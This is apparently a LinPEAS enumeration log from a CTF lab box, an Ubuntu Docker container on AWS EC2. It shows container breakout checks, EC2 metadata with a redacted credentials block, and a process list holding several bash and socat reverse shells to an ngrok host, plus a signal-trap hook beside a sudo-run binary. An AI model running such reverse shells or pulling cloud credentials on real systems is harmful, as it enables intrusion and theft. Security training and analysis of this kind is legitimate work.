@@ -1,0 +1,2207 @@
+    /---------------------------------------------------------------------------------\
+    |                             Do you like PEASS?                                  |
+    |---------------------------------------------------------------------------------|
+    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |
+    |         Follow on Twitter         :     @hacktricks_live                        |
+    |         Respect on HTB            :     SirBroccoli                             |
+    |---------------------------------------------------------------------------------|
+    |                                 Thank you!                                      |
+    \---------------------------------------------------------------------------------/
+          LinPEAS-ng by carlospolop                                                                                                                                   
+                                                                                                                                                                      
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                  
+                                                                                                                                                                      
+Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
+ LEGEND:                                                                                                                                                              
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look into it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMagenta: Your username
+
+ Starting LinPEAS. Caching Writable Folders...
+                               ╔═══════════════════╗
+═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                   
+                               ╚═══════════════════╝                                                                                                                  
+OS: Linux version 6.8.0-1021-aws (buildd@lcy02-amd64-111) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #23-Ubuntu SMP Mon Dec  9 23:59:34 UTC 2024
+User & Groups: uid=1001(adalberto) gid=1001(adalberto) groups=1001(adalberto)
+Hostname: ip-10-0-163-175
+
+[-] No network discovery capabilities (fping or ping not found)
+[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                                                                                                     
+                                                                                                                                                                      
+
+Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
+DONE
+                                                                                                                                                                      
+                              ╔════════════════════╗                                                                                                                  
+══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                    
+                              ╚════════════════════╝                                                                                                                  
+╔══════════╣ Operative system
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                                     
+Linux version 6.8.0-1021-aws (buildd@lcy02-amd64-111) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #23-Ubuntu SMP Mon Dec  9 23:59:34 UTC 2024
+Distributor ID: Ubuntu
+Description:    Ubuntu 24.04.2 LTS
+Release:        24.04
+Codename:       noble
+
+╔══════════╣ Sudo version
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                                        
+Sudo version 1.9.15p5
+
+
+╔══════════╣ PATH
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                                                
+/home/adalberto/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                                         
+
+╔══════════╣ Date & uptime
+Sat Feb 14 13:41:46 -03 2026                                                                                                                                          
+ 13:41:46 up 30 min,  0 user,  load average: 2.68, 2.03, 1.23
+
+╔══════════╣ Unmounted file-system?
+╚ Check if you can mount umounted devices                                                                                                                             
+
+╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
+                                                                                                                                                                      
+╔══════════╣ Environment
+╚ Any private information inside environment variables?                                                                                                               
+MAIL=/var/mail/adalberto                                                                                                                                              
+USER=adalberto
+SHLVL=5
+HOME=/home/adalberto
+LC_CTYPE=C.UTF-8
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+LOGNAME=adalberto
+_=./linpeas.sh
+TERM=xterm
+APACHE_LOCK_DIR=/var/lock/apache2
+LANG=C.UTF-8
+SHELL=/bin/bash
+APACHE_RUN_GROUP=www-data
+APACHE_RUN_USER=www-data
+APACHE_LOG_DIR=/var/log/apache2
+PWD=/var/www/blogo
+
+╔══════════╣ Searching Signature verification failed in dmesg
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                                                 
+dmesg Not Found                                                                                                                                                       
+                                                                                                                                                                      
+╔══════════╣ Protections
+═╣ AppArmor enabled? .............. /etc/apparmor.d
+═╣ AppArmor profile? .............. docker-default (enforce)
+═╣ is linuxONE? ................... s390x Not Found
+═╣ grsecurity present? ............ grsecurity Not Found                                                                                                              
+═╣ PaX bins present? .............. PaX Not Found                                                                                                                     
+═╣ Execshield enabled? ............ Execshield Not Found                                                                                                              
+═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                
+═╣ Seccomp enabled? ............... enabled                                                                                                                           
+═╣ User namespace? ................ enabled
+═╣ unpriv_userns_clone? ........... 1
+═╣ unpriv_bpf_disabled? ........... 2
+═╣ Cgroup2 enabled? ............... enabled
+═╣ kptr_restrict? ................. 1
+═╣ dmesg_restrict? ................ 1
+═╣ ptrace_scope? .................. 1
+═╣ protected_symlinks? ............ 1
+═╣ protected_hardlinks? ........... 1
+═╣ perf_event_paranoid? ........... 4
+═╣ mmap_min_addr? ................. 65536
+═╣ lockdown mode? ................. /sys/kernel/security/lockdown Not Found
+═╣ Kernel hardening flags? ........ kernel config Not Found                                                                                                           
+═╣ Is ASLR enabled? ............... Yes                                                                                                                               
+═╣ Printer? ....................... No
+═╣ Is this a virtual machine? ..... Yes (docker)
+
+╔══════════╣ Kernel Modules Information
+══╣ Kernel modules with weak perms?                                                                                                                                   
+/lib/modules Not Found                                                                                                                                                
+                                                                                                                                                                      
+══╣ Kernel modules loadable? 
+Modules can be loaded                                                                                                                                                 
+══╣ Module signature enforcement? 
+Not enforced                                                                                                                                                          
+
+╔══════════╣ CVE-2025-38352 - POSIX CPU timers race
+═╣ Kernel release ............... 6.8.0-1021-aws                                                                                                                      
+═╣ Comparable version ........... 6.8.0.1021                                                                                                                          
+═╣ Task_work config ............. Unknown (CONFIG_POSIX_CPU_TIMERS_TASK_WORK not found)                                                                               
+═╣ Patch status ................. Kernel train 6.8.0.1021 (verify commit f90fff1e152dedf52b932240ebbd670d83330eca manually)                                           
+═╣ CVE-2025-38352 risk .......... Unknown - missing configuration data
+                                                                                                                                                                      
+
+
+                                   ╔═══════════╗
+═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                   
+                                   ╚═══════════╝                                                                                                                      
+╔══════════╣ Container related tools present (if any):
+/usr/bin/nsenter                                                                                                                                                      
+/usr/bin/unshare
+/usr/sbin/chroot
+/usr/sbin/capsh
+/usr/sbin/setcap
+/usr/sbin/getcap
+
+╔══════════╣ Container details
+═╣ Is this a container? ........... docker                                                                                                                            
+═╣ Systemd Container .............. docker═╣ Any running containers? ........ No
+                                                                                                                                                                      
+╔══════════╣ Docker Container details
+═╣ Am I inside Docker group ....... No                                                                                                                                
+═╣ Looking and enumerating Docker Sockets (if any):
+═╣ Docker version ................. Not Found
+═╣ Vulnerable to CVE-2019-5736 .... Not Found
+═╣ Vulnerable to CVE-2019-13139 ... Not Found                                                                                                                         
+═╣ Vulnerable to CVE-2021-41091 ... Not Found                                                                                                                         
+═╣ Rootless Docker? ............... No                                                                                                                                
+
+
+╔══════════╣ Container & breakout enumeration
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html                                
+═╣ Container ID ................... ip-10-0-163-175═╣ Container Full ID .............. /                                                                              
+══╣ Security Mechanisms
+═╣ Seccomp mode ................... filtering (2)                                                                                                                     
+═╣ Seccomp filters ............... 11
+═╣ AppArmor profile? .............. docker-default (enforce)
+═╣ User proc namespace? ........... enabled         0          0 4294967295
+
+  Mappings (Container -> Host -> Range):
+  0 -> 0 -> 4294967295
+══╣ Known Vulnerabilities
+═╣ Vulnerable to CVE-2019-5021 .... No                                                                                                                                
+                                                                                                                                                                      
+═╣ Container escape tools present .. /usr/bin/nsenter
+══╣ Runtime Vulnerabilities
+══╣ Breakout via mounts                                                                                                                                               
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts.html                     
+═╣ /proc mounted? ................. Yes
+═╣ /dev mounted? .................. No
+═╣ Run unshare .................... No                                                                                                                                
+═╣ release_agent breakout 1........ No                                                                                                                                
+═╣ release_agent breakout 2........ No                                                                                                                                
+═╣ release_agent breakout 3........                                                                                                                                   
+═╣ core_pattern breakout .......... No                                                                                                                                
+═╣ binfmt_misc breakout ........... No                                                                                                                                
+═╣ uevent_helper breakout ......... No                                                                                                                                
+═╣ Docker socket mounted? ......... No                                                                                                                                
+═╣ Common host filesystem mounted?  /dev/root on /etc/hostname type ext4 (rw,relatime,discard,errors=remount-ro,commit=30)
+/dev/root on /etc/hosts type ext4 (rw,relatime,discard,errors=remount-ro,commit=30)
+═╣ Interesting mounts ............. overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/W24XHZSZ2Z272J7W266EKI3CGI:/var/lib/docker/overlay2/l/N5C5MMUZBMFZ2IG6E3QS2EJ5ZS:/var/lib/docker/overlay2/l/4GJEGPUI2ZROUFOU7ZIRRFPVCF:/var/lib/docker/overlay2/l/AI7L6JE5BQDJVUS64LRH44QKMB:/var/lib/docker/overlay2/l/7NEHBSFPB2EIQHDCGUQYO6JZGV:/var/lib/docker/overlay2/l/OI72RHKB626IXHAJB6JVTAVEFN,upperdir=/var/lib/docker/overlay2/6c2785282e4ad3d8ff494fca373254155ec0a750140e4137f4592f79622827c7/diff,workdir=/var/lib/docker/overlay2/6c2785282e4ad3d8ff494fca373254155ec0a750140e4137f4592f79622827c7/work,nouserxattr)
+═╣ Writable mount points ......... overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/W24XHZSZ2Z272J7W266EKI3CGI:/var/lib/docker/overlay2/l/N5C5MMUZBMFZ2IG6E3QS2EJ5ZS:/var/lib/docker/overlay2/l/4GJEGPUI2ZROUFOU7ZIRRFPVCF:/var/lib/docker/overlay2/l/AI7L6JE5BQDJVUS64LRH44QKMB:/var/lib/docker/overlay2/l/7NEHBSFPB2EIQHDCGUQYO6JZGV:/var/lib/docker/overlay2/l/OI72RHKB626IXHAJB6JVTAVEFN,upperdir=/var/lib/docker/overlay2/6c2785282e4ad3d8ff494fca373254155ec0a750140e4137f4592f79622827c7/diff,workdir=/var/lib/docker/overlay2/6c2785282e4ad3d8ff494fca373254155ec0a750140e4137f4592f79622827c7/work,nouserxattr)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
+devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+tmpfs on /proc/latency_stats type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+═╣ Shared mount points ........... ══╣ Capability Checks
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/capabilities-abuse-escape.html            
+═╣ Dangerous capabilities ......... Current: =                                                                                                                        
+Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+Ambient set =
+Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_module,!cap_sys_rawio,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore
+Securebits: 00/0x0/1'b0 (no-new-privs=0)
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+ secure-no-ambient-raise: no (unlocked)
+uid=1001(adalberto) euid=1001(adalberto)
+gid=1001(adalberto)
+groups=1001(adalberto)
+Guessed mode: HYBRID (4)
+═╣ Ambient capabilities ........... ═╣ Dangerous syscalls allowed ... 1
+══╣ Namespace Checks
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/namespaces/index.html                                                          
+═╣ Current namespaces ............. total 0                                                                                                                           
+lrwxrwxrwx 1 adalberto adalberto 0 Feb 14 13:42 cgroup -> 'cgroup:[4026532223]'
+lrwxrwxrwx 1 adalberto adalberto 0 Feb 14 13:42 ipc -> 'ipc:[4026532221]'
+lrwxrwxrwx 1 adalberto adalberto 0 Feb 14 13:42 mnt -> 'mnt:[4026532217]'
+lrwxrwxrwx 1 adalberto adalberto 0 Feb 14 13:42 net -> 'net:[4026531840]'
+lrwxrwxrwx 1 adalberto adalberto 0 Feb 14 13:42 pid -> 'pid:[4026532222]'
+lrwxrwxrwx 1 adalberto adalberto 0 Feb 14 13:42 pid_for_children -> 'pid:[4026532222]'
+lrwxrwxrwx 1 adalberto adalberto 0 Feb 14 13:42 time -> 'time:[4026531834]'
+lrwxrwxrwx 1 adalberto adalberto 0 Feb 14 13:42 time_for_children -> 'time:[4026531834]'
+lrwxrwxrwx 1 adalberto adalberto 0 Feb 14 13:42 user -> 'user:[4026531837]'
+lrwxrwxrwx 1 adalberto adalberto 0 Feb 14 13:42 uts -> 'uts:[4026532219]'
+═╣ Host network namespace? ........ No
+═╣ Host IPC namespace? ........... No
+═╣ Host PID namespace? ........... No
+═╣ Host UTS namespace? ........... No
+═╣ Looking and enumerating Docker Sockets (if any):
+══╣ Additional Breakout Vectors                                                                                                                                       
+═╣ is modprobe present ............ No                                                                                                                                
+═╣ DoS via panic_on_oom ........... No                                                                                                                                
+═╣ DoS via panic_sys_fs ........... No                                                                                                                                
+═╣ DoS via sysreq_trigger_dos ..... No                                                                                                                                
+═╣ Container escape tools in PATH . /usr/bin/nsenter                                                                                                                  
+══╣ Extra Breakout Vectors
+═╣ /proc/config.gz readable ....... No                                                                                                                                
+═╣ /proc/sched_debug readable ..... No                                                                                                                                
+═╣ /proc/*/mountinfo readable ..... Yes                                                                                                                               
+═╣ /sys/kernel/security present ... Yes
+═╣ /sys/kernel/security writable .. No
+═╣ /proc/kmsg readable ............ No                                                                                                                                
+═╣ /proc/kallsyms readable ........ Yes                                                                                                                               
+═╣ /proc/self/mem readable ........ No
+═╣ /proc/kcore readable ........... No                                                                                                                                
+═╣ /proc/kmem readable ............ No                                                                                                                                
+═╣ /proc/kmem writable ............ No                                                                                                                                
+═╣ /proc/mem readable ............. No                                                                                                                                
+═╣ /proc/mem writable ............. No                                                                                                                                
+═╣ /sys/kernel/vmcoreinfo readable  Yes                                                                                                                               
+═╣ /sys/firmware/efi/vars writable  No
+═╣ /sys/firmware/efi/efivars writable No                                                                                                                              
+═╣ Kernel version .............. Linux ip-10-0-163-175 6.8.0-1021-aws #23-Ubuntu SMP Mon Dec  9 23:59:34 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+═╣ Kernel modules ............. ./linpeas.sh: 2662: lsmod: not found
+═╣ Container runtime sockets .. No
+═╣ Container runtime configs .. No
+══╣ Interesting Files & Mounts
+═╣ Interesting files mounted ........ overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/W24XHZSZ2Z272J7W266EKI3CGI:/var/lib/docker/overlay2/l/N5C5MMUZBMFZ2IG6E3QS2EJ5ZS:/var/lib/docker/overlay2/l/4GJEGPUI2ZROUFOU7ZIRRFPVCF:/var/lib/docker/overlay2/l/AI7L6JE5BQDJVUS64LRH44QKMB:/var/lib/docker/overlay2/l/7NEHBSFPB2EIQHDCGUQYO6JZGV:/var/lib/docker/overlay2/l/OI72RHKB626IXHAJB6JVTAVEFN,upperdir=/var/lib/docker/overlay2/6c2785282e4ad3d8ff494fca373254155ec0a750140e4137f4592f79622827c7/diff,workdir=/var/lib/docker/overlay2/6c2785282e4ad3d8ff494fca373254155ec0a750140e4137f4592f79622827c7/work,nouserxattr)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
+cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
+/dev/root on /etc/resolv.conf type ext4 (rw,relatime,discard,errors=remount-ro,commit=30)
+/dev/root on /etc/hostname type ext4 (rw,relatime,discard,errors=remount-ro,commit=30)
+/dev/root on /etc/hosts type ext4 (rw,relatime,discard,errors=remount-ro,commit=30)
+proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
+tmpfs on /proc/acpi type tmpfs (ro,relatime,inode64)
+tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+tmpfs on /proc/latency_stats type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+tmpfs on /proc/scsi type tmpfs (ro,relatime,inode64)
+tmpfs on /sys/firmware type tmpfs (ro,relatime,inode64)
+═╣ Possible entrypoints ........... -rwxrwxr-x 1 adalberto adalberto 32 Feb 14 13:16 /tmp/x.sh
+
+
+╔══════════╣ Container - Writable bind mounts w/o nosuid (SUID persistence risk)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html#writable-bind-mounts           
+═╣ Writable bind mounts without nosuid ............ No                                                                                                                
+
+
+                                     ╔═══════╗
+═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                   
+                                     ╚═══════╝                                                                                                                        
+grep: /etc/motd: No such file or directory
+Learn and practice cloud hacking techniques in https://training.hacktricks.xyz
+                                                                                                                                                                      
+═╣ GCP Virtual Machine? ................. No
+═╣ GCP Cloud Funtion? ................... No
+═╣ AWS ECS? ............................. No
+═╣ AWS EC2? ............................. Yes
+═╣ AWS EC2 Beanstalk? ................... No
+═╣ AWS Lambda? .......................... No
+═╣ AWS Codebuild? ....................... No
+═╣ DO Droplet? .......................... No
+═╣ IBM Cloud VM? ........................ No
+═╣ Azure VM or Az metadata? ............. No
+═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
+═╣ Azure Automation Account? ............ No
+═╣ Aliyun ECS? .......................... No
+═╣ Tencent CVM? ......................... No
+
+╔══════════╣ AWS EC2 Enumeration
+ami-id: ami-020525ce7bc4004f0                                                                                                                                         
+instance-action: none
+instance-id: i-02d1ebe94373a7faf
+instance-life-cycle: on-demand
+instance-type: t3a.micro
+region: us-east-1
+
+══╣ Account Info
+{                                                                                                                                                                     
+  "Code" : "Success",
+  "LastUpdated" : "2026-02-14T16:12:31Z",
+  "AccountId" : "317608390162"
+}
+
+══╣ Network Info
+Mac: 02:8a:0a:66:df:69/                                                                                                                                               
+Owner ID: 317608390162
+Public Hostname: 
+Security Groups: labs-ctfs-sg
+Private IPv4s:
+3.239.25.195
+Subnet IPv4: 10.0.0.0/16
+PrivateIPv6s:
+
+Subnet IPv6: 
+Public IPv4s:
+3.239.25.195
+
+
+══╣ IAM Role
+                                                                                                                                                                      
+
+══╣ User Data
+#!/bin/bash                                                                                                                                                           
+sudo systemctl stop ssh.socket
+sudo systemctl disable ssh.socket
+cd /home/ubuntu && sudo docker compose up -d
+START_TIME=$(date +%s); until sudo docker logs ctf9-box1 | grep -qEo "OK" || [ $(( $(date +%s) - START_TIME )) -ge 550 ]; do sleep 5; done; [ $(( $(date +%s) - START_TIME )) -ge 550 ] && curl -f https://solyd.com.br/aluno/ctf/webhook/CMe4WWlDMlokv9Eu6CVBEAoeZ1OsEiVj/check-connection/c69ba1e9-e4d3-428e-b6db-1703585ad375/0/ || curl -f https://solyd.com.br/aluno/ctf/webhook/CMe4WWlDMlokv9Eu6CVBEAoeZ1OsEiVj/check-connection/c69ba1e9-e4d3-428e-b6db-1703585ad375/1/
+
+
+══╣ EC2 Security Credentials
+{                                                                                                                                                                     
+  "Code" : "Success",
+  "LastUpdated" : "2026-02-14T16:12:17Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIA[REDACTED]",
+  "SecretAccessKey" : "[REDACTED]",
+  "Token" : "[REDACTED]",
+  "Expiration" : "2026-02-14T22:26:27Z"
+}
+══╣ SSM Runnig
+                                                                                                                                                                      
+
+
+                ╔════════════════════════════════════════════════╗
+════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                    
+                ╚════════════════════════════════════════════════╝                                                                                                    
+╔══════════╣ Running processes (cleaned)
+╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                           
+root           1  0.0  0.2   4588  2432 pts/0    Ss+  13:12   0:00 bash
+root          26  0.0  1.0 203872  9640 ?        Ss   13:13   0:00 /usr/sbin/apache2 -k start
+www-data      43  0.0  0.9 204672  8516 ?        S    13:13   0:00  _ /usr/sbin/apache2 -k start
+www-data      44  0.0  0.8 204504  8260 ?        S    13:13   0:00  _ /usr/sbin/apache2 -k start
+www-data    3596  0.0  0.1   2800  1664 ?        S    13:33   0:00  |   _ sh -c -- bash -c 'bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1'
+www-data    3597  0.0  0.2   4324  2176 ?        S    13:33   0:00  |       _ bash -c bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1
+www-data    3598  0.0  0.2   4588  2560 ?        S    13:33   0:00  |           _ bash -i
+www-data    3714  0.0  0.5  15264  5120 ?        S    13:33   0:00  |               _ python3 -c import pty; pty.spawn("/bin/bash")
+www-data    3715  0.0  0.2   4972  2560 pts/10   Ss   13:33   0:00  |                   _ /bin/bash
+root        3749  0.0  0.2   7108  2612 pts/10   S    13:33   0:00  |                       _ su adalberto
+adalber+    3766  0.0  0.2   5016  2816 pts/10   S    13:33   0:00  |                           _ bash
+adalber+    3801  0.0  0.2   3144  1920 pts/10   S+   13:34   0:00  |                               _ script -qc /bin/bash /dev/null
+adalber+    3802  0.0  0.2   5016  2816 pts/11   Ss   13:34   0:00  |                                   _ /bin/bash
+adalber+    3857  0.0  0.1   3268  1664 pts/11   S    13:34   0:00  |                                       _ cat /tmp/f
+adalber+    3858  0.4  0.3   5248  2944 pts/11   S+   13:34   0:02  |                                       _ /bin/bash -i
+adalber+    3859  0.0  4.3  42304 41088 pts/11   S    13:34   0:00  |                                       _ script -q /dev/null
+adalber+    3860  0.4  0.3   5272  2944 pts/12   Ss+  13:34   0:02  |                                           _ bash -i
+www-data      45  0.0  0.9 204656  8516 ?        S    13:13   0:00  _ /usr/sbin/apache2 -k start
+www-data      46  0.0  0.9 204496  8576 ?        S    13:13   0:00  _ /usr/sbin/apache2 -k start
+www-data      47  0.0  0.8 204480  8388 ?        S    13:13   0:00  _ /usr/sbin/apache2 -k start
+www-data     406  0.0  0.1   2800  1536 ?        S    13:14   0:00  |   _ sh -c -- bash -c 'bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1'
+www-data     407  0.0  0.2   4324  1920 ?        S    13:14   0:00  |       _ bash -c bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1
+www-data     408  0.0  0.2   4588  2304 ?        S    13:14   0:00  |           _ bash -i
+www-data     410  0.0  0.5  15260  4736 ?        S    13:14   0:00  |               _ python3 -c import pty; pty.spawn("/bin/bash")
+www-data     411  0.0  0.2   4972  2304 pts/1    Ss   13:14   0:00  |                   _ /bin/bash
+www-data     413  0.0  0.1   3100  1664 pts/1    S+   13:14   0:00  |                       _ script -qc /bin/bash /dev/null
+www-data     414  0.0  0.1   2800  1536 pts/2    Ss   13:14   0:00  |                           _ sh -c /bin/bash
+www-data     415  0.0  0.2   4972  2304 pts/2    S    13:14   0:00  |                               _ /bin/bash
+root         418  0.0  0.2   7116  2484 pts/2    S    13:15   0:00  |                                   _ su adalberto
+adalber+     419  0.0  0.2   5016  2176 pts/2    S    13:15   0:00  |                                       _ bash
+adalber+     422  0.0  0.1   3144  1664 pts/2    S+   13:15   0:00  |                                           _ script -qc /bin/bash /dev/null
+adalber+     423  0.0  0.2   5016  2432 pts/3    Ss   13:15   0:00  |                                               _ /bin/bash
+adalber+     431  0.0  0.2   4752  1920 pts/3    S    13:16   0:00  |                                                   _ bash -c trap /tmp/x.sh SIGUSR1; sleep 999999
+adalber+     432  0.0  0.1   3124  1536 pts/3    S    13:16   0:00  |                                                   |   _ sleep 999999
+root         433  0.0  0.3  14140  3072 pts/3    S+   13:16   0:00  |                                                   _ sudo /usr/local/bin/below
+root         434  0.0  0.2  14140  2224 pts/4    Ss   13:16   0:00  |                                                       _ sudo /usr/local/bin/below
+root         435  0.6  4.3 491020 40448 pts/4    Sl+  13:16   0:09  |                                                           _ /usr/local/bin/below
+www-data     403  0.0  0.8 204480  8388 ?        S    13:13   0:00  _ /usr/sbin/apache2 -k start
+www-data    1740  0.0  0.1   2800  1664 ?        S    13:23   0:00  |   _ sh -c -- bash -c 'bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1'
+www-data    1741  0.0  0.2   4324  2048 ?        S    13:23   0:00  |       _ bash -c bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1
+www-data    1742  0.0  0.2   4588  2560 ?        S    13:23   0:00  |           _ bash -i
+www-data    1792  0.0  0.5  15264  5120 ?        S    13:23   0:00  |               _ python3 -c import pty; pty.spawn("/bin/bash")
+www-data    1793  0.0  0.2   4972  2688 pts/5    Ss   13:23   0:00  |                   _ /bin/bash
+root        1843  0.0  0.2   7112  2484 pts/5    S    13:24   0:00  |                       _ su adalberto
+adalber+    1844  0.0  0.2   5016  2688 pts/5    S    13:24   0:00  |                           _ bash
+adalber+    2430 97.4  0.0    536     0 pts/5    R+   13:27  14:38  |                               _ ./socat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:0.tcp.sa.ngrok.io:16908
+adalber+    2431  0.0  0.2   5016  2816 pts/6    Ss+  13:27   0:00  |                                   _ bash -li
+www-data     404  0.0  0.9 204672  8692 ?        S    13:13   0:00  _ /usr/sbin/apache2 -k start
+www-data     405  0.0  0.8 204672  8388 ?        S    13:13   0:00  _ /usr/sbin/apache2 -k start
+www-data    3036  0.0  0.1   2800  1664 ?        S    13:30   0:00  |   _ sh -c -- bash -c 'bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1'
+www-data    3037  0.0  0.2   4324  1920 ?        S    13:30   0:00  |       _ bash -c bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1
+www-data    3038  0.0  0.2   4588  2560 ?        S    13:30   0:00  |           _ bash -i
+www-data    3296  0.0  0.5  15260  5120 ?        S    13:31   0:00  |               _ python3 -c import pty; pty.spawn("/bin/bash")
+www-data    3297  0.0  0.2   4972  2816 pts/7    Ss   13:31   0:00  |                   _ /bin/bash
+www-data    3332  0.0  0.1   3100  1792 pts/7    S+   13:31   0:00  |                       _ script -qc /bin/bash /dev/null
+www-data    3333  0.0  0.1   2800  1664 pts/8    Ss   13:31   0:00  |                           _ sh -c /bin/bash
+www-data    3334  0.0  0.2   4972  2816 pts/8    S    13:31   0:00  |                               _ /bin/bash
+www-data    3418 96.0  0.0    536   128 pts/8    R+   13:32   9:34  |                                   _ /tmp/socat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:0.tcp.sa.ngrok.io:16908
+www-data    3616  0.0  0.7 204472  7108 ?        S    13:33   0:00  _ /usr/sbin/apache2 -k start
+www-data    3649  0.0  0.8 204480  8388 ?        S    13:33   0:00  _ /usr/sbin/apache2 -k start
+www-data    8728  0.0  0.1   2800  1792 ?        S    13:39   0:00  |   _ sh -c -- bash -c 'bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1'
+www-data    8729  0.0  0.2   4324  2048 ?        S    13:39   0:00  |       _ bash -c bash -i >& /dev/tcp/0.tcp.sa.ngrok.io/16908 0>&1
+www-data    8730  0.0  0.2   4588  2560 ?        S    13:39   0:00  |           _ bash -i
